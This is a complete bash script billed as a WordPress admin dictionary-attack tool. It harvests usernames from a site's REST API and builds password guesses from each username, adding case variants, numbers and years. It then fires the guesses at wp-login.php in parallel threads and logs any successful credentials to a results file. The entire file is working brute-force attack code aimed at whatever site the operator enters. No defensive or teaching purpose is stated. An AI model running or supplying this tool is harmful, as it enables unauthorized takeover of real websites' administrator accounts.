#!/bin/bash
# Name       : Wordpress Brutefosh
# Version    : 2.0
# Desc.      : Dictionary Attack Tool - Wordpress Admin
# Coded by   : Schopath
# Website    : www.zerobyte.id
# Updated on : 2019-03-29

#----------- CONFIGURATION -----------
curl_timeout=20
multithread_limit=10
#--------- CONFIGURATION EOF ---------

if [[ -f wpusername.tmp ]]
then
	rm wpusername.tmp
fi

RED='\e[31m'
GRN='\e[32m'
YEL='\e[33m'
CLR='\e[0m'

function _GetUserWPJSON() {
	Target="${1}";
	UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
	echo ""
	if [[ -z ${UsernameLists} ]];
	then
		echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
	else
		echo -ne > wpusername.tmp
		for Username in ${UsernameLists};
		do
			echo "INFO: Found username \"${Username}\"..."
			echo "${Username}" >> wpusername.tmp
		done
	fi
}

function _TestLogin() {
	Target="${1}"
	Username="${2}"
	Password="${3}"
	LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
	if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
	then
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
	then
		echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
		echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
	else
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	fi
}

function PasswdGenerator() {
	WORD="${1}"
	echo "${WORD}"
	echo "${WORD}" | tr a-z A-Z
	echo "${WORD}123"
	echo "${WORD}123" | tr a-z A-Z
	echo "${WORD}admin"
	echo "${WORD}${WORD}"
	echo "${WORD}${WORD}123"
	echo "${WORD}${WORD}" | tr a-z A-Z
	echo "${WORD}${WORD}123" | tr a-z A-Z
	foo=${WORD:0};echo ${foo^}
	foo=${WORD:0};echo ${foo^}123
	for ((c=1;c<=99;c++))
	do
		echo "${WORD}${c}"
	done
	for ((c=1;c<=9;c++))
	do
		echo "${WORD}0${c}"
	done
	for ((c=1900;c<=$(date +%Y);c++))
	do
		echo "${WORD}${c}"
	done
	for ((c=1;c<=99;c++))
	do
		foo=${WORD:0};echo ${foo^}${c}
	done
	for ((c=1;c<=9;c++))
	do
		foo=${WORD:0};echo ${foo^}0${c}
	done
	for ((c=1900;c<=$(date +%Y);c++))
	do
		foo=${WORD:0};echo ${foo^}${c}
	done
}

echo ' _    _               _                         '
echo '| |  | | ___  _ __ __| |_ __  _ __ ___  ___ ___ '
echo '| |/\| |/ _ \| `__/ _` | `_ \| `__/ _ \/ __/ __|'
echo '\  /\  / (_) | | | (_| | |_) | | |  __/\__ \__ \'
echo ' \/  \/ \___/|_|  \__,_| .__/|_|  \___||___/___/'
echo '                       |_|.::Brutefo(sh) 2019::.'
echo ''

echo -ne "[?] Input website target : "
read Target

curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
then
	echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
	exit
fi

echo -ne "[?] Input password lists in (file) : "
read PasswordLists

if [[ ! -f ${PasswordLists} ]]
then
	echo -e "${RED}ERROR: Wordlists not found!${CLR}"
	PasswordLists=/dev/null
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]
then
	for User in $(cat wpusername.tmp)
	do
		echo "INFO: Generate password from ${User}..."
		echo -ne "" > wpbf-passwords.lst.tmp
		PasswdGenerator ${User} >> wpbf-passwords.lst.tmp
		cat ${PasswordLists} >> wpbf-passwords.lst.tmp
		(
			for Pass in $(cat wpbf-passwords.lst.tmp)
			do
				((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
				_TestLogin ${Target} ${User} ${Pass} &
			done
			wait
		)
	done
	echo -ne "" > wpbf-passwords.lst.tmp
	rm wpbf-passwords.lst.tmp
else
	echo -e "${YEL}INFO: Cannot find username${CLR}"
	echo -ne "[?] Input username manually : "
	read User
	if [[ -z ${User} ]]
	then
		echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
		exit
	fi
	echo "INFO: Generate password from ${User}..."
	echo -ne "" > wpbf-passwords.lst.tmp
	PasswdGenerator ${User} >> wpbf-passwords.lst.tmp
	cat ${PasswordLists} >> wpbf-passwords.lst.tmp
	(
		for Pass in $(cat wpbf-passwords.lst.tmp)
		do
			((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
			_TestLogin ${Target} ${User} ${Pass} &
		done
		wait
	)
	echo -ne "" > wpbf-passwords.lst.tmp
	rm wpbf-passwords.lst.tmp
fi
echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"